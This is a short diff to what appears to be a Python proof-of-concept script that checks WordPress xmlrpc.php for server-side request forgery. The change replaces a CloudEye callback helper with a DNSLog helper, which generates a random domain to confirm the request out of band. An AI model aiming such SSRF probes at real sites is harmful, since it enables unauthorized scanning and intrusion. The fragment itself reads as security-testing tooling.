@@ -12,7 +12,7 @@ Version
 """
 
 import requests
-from plugin.cloudeye import CloudEye
+from plugin.DNSLog import DNSLog
 
 req_timeout = 10
 
@@ -22,7 +22,7 @@ def poc(url):
         url = 'http://' + url
     targeturl = url.rstrip('/') + "/xmlrpc.php"
 
-    c = CloudEye()
+    c = DNSLog()
     dst = c.getRandomDomain('wpssrf')
 
     # 第一个地址段为SSRF的目标地址，格式为(http[s]://IP|DOAMIN)[:(80|8080|443)]。
